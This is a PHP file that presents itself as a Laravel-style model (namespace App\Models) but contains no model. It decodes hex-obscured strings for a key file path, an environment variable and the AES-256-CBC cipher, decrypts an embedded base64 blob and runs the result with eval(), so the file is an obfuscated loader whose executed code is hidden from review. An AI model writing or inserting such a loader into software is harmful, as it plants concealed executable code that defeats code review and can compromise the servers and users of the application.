<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('QtYjVjz+CRMmab02mS87Xw==');

$c=base64_decode(

'2sbKgCjXqQ8AAAk0F5cRa0ojW8zH43wgZI716oEptna+SCIbaHNelj12NhK++1mXB9CADl0Vf1SI' .
'jUmFbYnjRk2H9cmeG3NOIaet0pfpdRBjkVS8w4c7DssDXRQFSS8wjEFnaZjdnE4Gzq52gXMTv5h9' .
'NqLe7uxGnrlM8Len7gw2EXlaTrl1ZiA0LzE0xYYXZVDYr6H5+YA/cvpKGZ9Weau6t8JInHg4MpGX' .
'pLVflY9i0JoziVKyQcatOsAAY4Op3zZQhPoSxaVg/y73RxynSmNNHzjniyqrhH3MU0vWt9QvYF6E' .
'3UGfJw+C/cNk73VCmDuEIRNoYzywnPOXZWbaewNbNQJquJ5GLMTTYkmOgFZ6P0253MXhS1LRlA3S' .
'po9kFuyIgBpSDU8862T5gpme4IU1x1lH7pYs4yrmMmuQX5ZsqQZjzHNkVzfEBLoslysRyNpqTkxW' .
'yD1rxPJ57+XCTL9v9Vz5ywHZOzKpEMbqg94cc59u07glGRhJe33BjRaOh2btMPGHh0aGFpnkbAF3' .
'vmZVkvwxhVOPGzXyHKXSiuR6wCnUpngUdI6KdLFMHxO8zexvJa92Ml3UROPabc0Qy924bw/5QkRK' .
'OxM+huxQ8FAB6oUqR8czM2LfGzNLJM5zY9LSR7LkWA12hYZjEM/opUKIjgINylRYRbvKjkefL7gm' .
'5w3pJNaWOlz/rSsQg2t0oap74v6HL4kMfPFB6ZPuNfpRPP3HOoiLWcCeNQqP4JZloRrZRSwHtN6B' .
'68MTFiDe7PoA9gfQCfgZ/3dcabmRwQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

